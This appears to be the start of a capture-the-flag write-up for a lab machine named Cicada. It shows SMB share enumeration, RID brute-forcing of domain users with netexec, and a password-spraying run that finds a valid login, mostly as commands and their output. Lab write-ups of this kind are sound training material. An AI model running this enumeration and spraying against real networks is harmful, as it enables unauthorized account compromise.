## Enum 


### Shares 

```sh

> smbclient -L cicada.htb
Password for [WORKGROUP\malisio]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUT
SMB1 disabled -- no workgroup available

```

```sh


netexec smb cicada.htb -u 'DOESNTEXITUSERTEST' -p '' --rid-brute | grep SidTypeUser

SMB                      10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

- Password Spraying

```sh

┌──(malisio㉿windows)-[~/ctf]
└─$ netexec smb 10.10.11.35 -u valid_users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'  --shares 
SMB         10.10.11.35     445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    NONE             [-] \Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    NONE             [-] \Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    NONE             [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.10.11.35     445    NONE             [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.10.11.35     445    NONE             [-] \john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    NONE             [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.10.11.35     445    NONE             [+] \michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
```


